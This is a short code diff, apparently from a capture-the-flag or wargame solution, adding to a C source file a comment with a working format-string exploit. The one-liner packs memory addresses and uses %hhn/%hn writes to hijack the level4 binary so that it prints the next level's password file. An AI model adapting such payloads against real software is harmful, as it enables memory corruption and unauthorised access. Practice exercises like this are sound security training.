@@ -19,6 +19,7 @@ void n(void)
         system("/bin/cat /home/user/level5/.pass");
 }
 
+// python -c "import struct,sys;sys.stdout.write(struct.pack('<I',0x8049810)+struct.pack('<I',0x8049811)+struct.pack('<I',0x8049812)+'A'*56+'%12\$hhn'+'A'*17+'%13\$hhn'+'A'*173+'%14\$hn')" | /home/user/level4/level4
 int main(void)
 {
     n();
